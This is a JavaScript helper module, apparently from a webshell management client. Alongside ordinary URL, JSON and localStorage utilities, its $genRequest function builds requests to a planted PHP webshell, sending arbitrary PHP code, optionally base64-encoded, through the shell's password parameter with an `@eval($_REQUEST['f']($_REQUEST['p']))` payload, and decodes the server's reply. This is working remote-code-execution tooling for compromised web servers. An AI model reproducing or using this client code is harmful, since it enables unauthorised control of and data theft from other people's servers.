import request from './http'
import base64 from './base64'
import CONST from './const_var'
import crypto from './crypto'

export default {
    $console(v) {
        console.log(JSON.stringify(v, null, 4))
    },
    $clone(v) {
        return JSON.parse(JSON.stringify(v))
        // return Object.assign({},v)
    },
    // 解析url
    $parseURL(url) {
        const a = document.createElement('a')
        a.href = url
        return {
            host: a.hostname,
            port: a.port,
            query: a.search,
            params: (function () {
                const ret = {}
                const seg = a.search.replace(/^\?/, '').split('&')
                const len = seg.length
                let i = 0
                let s
                for (; i < len; i++) {
                    if (!seg[i]) {
                        continue
                    }
                    s = seg[i].split('=')
                    ret[s[0]] = s[1]
                }
                return ret
            }()),
            hash: a.hash.replace('#', ''),
        }
    },
    $jsonParse(v) {
        console.log(v)
        if (v !== undefined && v !== null && v !== '') {
            let temp
            try {
                temp = JSON.parse(`${v}`)
                console.log('json解析正常：', temp)
                if (typeof (temp) === 'number') {
                    return [temp]
                }
                return temp
            } catch (e) {
                console.log('json解析出错：', e)
                temp = [v]
                return temp
            }
        } else {
            return []
        }
    },
    $storageSet(key, value) {
        if (typeof value === 'object') {
            value = JSON.stringify(value)
        }
        localStorage.setItem(key, value)
    },
    $storageGet(key, default2 = '') {
        const value = localStorage.getItem(key) || default2
        try {
            return JSON.parse(value)
        } catch (e) {
            return value
        }
    },
    $storageRemove(key) {
        localStorage.removeItem(key)
    },
    $random() {
        return Math.random().toString(36).slice(2) + Date.now().toString(36)
    },

    //生成shell url
    $geneShellUrl(shell) {
        if (shell.url.indexOf('?') !== -1) {
            return shell.url + '&' + shell.pwd + '='
        }
        return shell.url + '?' + shell.pwd + '='
    },

    async $genRequest(shell, code, codeParams = [], encode) {
        // console.log('codeParams:::', codeParams)
        shell.encode = 'UTF-8'

        if (shell.decodeType === CONST.DECODE_TYPE.NONE.VALUE) {
            code = code(CONST.DECODE_TYPE.NONE.FUNC, ...codeParams)
        }
        if (shell.decodeType === CONST.DECODE_TYPE.BASE64.VALUE) {
            code = code(CONST.DECODE_TYPE.BASE64[shell.type], ...codeParams)
        }

        code = `header("Content-Type: text/html;charset=${encode || shell.encode}");` + code

        let params = {}
        if (shell.encodeType === CONST.ENCODE_TYPE.NONE) {
            params[shell.pwd] = code
        }
        if (shell.encodeType === CONST.ENCODE_TYPE.BASE64) {
            let base64Str = crypto.base64Encode(code)
            // console.log(base64Str)
            // base64Str = encodeURIComponent(base64Str)
            params = {f: 'base64_decode', p: base64Str, r: code}
            params[shell.pwd] = `@eval($_REQUEST['f']($_REQUEST['p']));`
            // params[shell.pwd] = `@eval(@base64_decode('${base64Str}'));`
        }

        return new Promise(async (resolve, reject) => {
            let res
            if (shell.requestType === CONST.REQUEST_TYPE.POST) {
                res = await request(shell.url, params, {}, 'POST')
            } else {
                res = await request(shell.url, {}, params)
            }
            if (`${res}`.indexOf('ERROR//') !== -1) {
                alert('ERROR')
                reject('')
            }
            if (shell.decodeType === CONST.DECODE_TYPE.BASE64.VALUE) {
                return resolve(crypto.base64Decode(res))
            }
            resolve(res)
        })
    },
}
